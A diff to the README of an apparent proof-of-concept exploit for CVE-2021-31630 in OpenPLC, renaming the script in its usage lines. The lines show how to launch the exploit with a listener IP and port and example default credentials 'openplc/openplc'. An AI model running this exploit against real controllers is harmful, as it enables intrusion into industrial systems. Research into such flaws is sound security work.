@@ -8,12 +8,12 @@ This repository contains a Proof of Concept (PoC) exploit for **CVE-2021-31630**
 To execute the exploit, run:
 
 ```bash
-python exploit.py -ip <LISTEN_IP> -p <LISTEN_PORT> -u <USERNAME> -pwd <PASSWORD>
+python3 OpenPlc-CVE-2021-31630.py -ip <LISTEN_IP> -p <LISTEN_PORT> -u <USERNAME> -pwd <PASSWORD>
 ```
 
 Example:
 ```bash
-python exploit.py -ip 192.168.1.100 -p 1337 -u openplc -pwd openplc
+python3 OpenPlc-CVE-2021-31630.py -ip 192.168.1.100 -p 1337 -u openplc -pwd openplc
 ```
 
 ## Arguments
